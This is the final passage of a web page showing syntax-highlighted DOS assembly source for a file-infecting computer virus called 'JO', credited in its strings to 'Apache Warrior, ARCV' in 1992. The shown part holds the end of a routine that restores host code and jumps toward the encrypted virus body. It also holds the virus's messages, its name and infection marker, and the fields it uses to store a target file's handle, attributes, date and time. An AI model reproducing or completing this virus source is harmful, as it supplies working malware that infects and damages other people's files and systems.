                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                        </span><span class="sc1">; new code</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">                    </span><span class="sc1">; Set Registers to encrypted Virus</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                         </span><span class="sc1">; Location</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">; Return</span><span class="sc0">

</span><span class="sc1">; Data Section, contains Messages etc.</span><span class="sc0">


</span><span class="sc1">;               Little message to the Wife to Be..</span><span class="sc0">

</span><span class="sc5">msg</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Looking Good Slimline Joanna.'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Made in England by Apache Warrior, ARCV Pres.'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0"> 
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Jo Ver. 1.11 (c) Apache Warrior 92.'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'$'</span><span class="sc0">

</span><span class="sc5">msg2</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'I Love You Joanna, Apache..'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">

</span><span class="sc5">virus_name</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[JO]'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0">                          </span><span class="sc1">; Virus Name..</span><span class="sc0">
</span><span class="sc5">author</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'By Apache Warrior, ARCV Pres.'</span><span class="sc0">      </span><span class="sc1">; Thats me..</span><span class="sc0">
</span><span class="sc5">filler</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">

</span><span class="sc5">oldstart</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4c00h</span><span class="sc0">                    </span><span class="sc1">; Orginal program start</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">j100h</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0">                        </span><span class="sc1">; Stores for jumps etc</span><span class="sc0">
</span><span class="sc5">jpover</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">string</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'65fd3'</span><span class="sc0">                      </span><span class="sc1">; ID String </span><span class="sc0">

</span><span class="sc5">heap</span><span class="sc4">:</span><span class="sc0">                                           </span><span class="sc1">; This code is not saved </span><span class="sc0">
</span><span class="sc5">handle</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
</span><span class="sc5">nameptr</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
</span><span class="sc5">attrib</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
</span><span class="sc5">date</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
</span><span class="sc5">time</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
</span><span class="sc5">tempmem</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">findat</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
</span><span class="sc5">si_val</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">

</span><span class="sc5">code</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
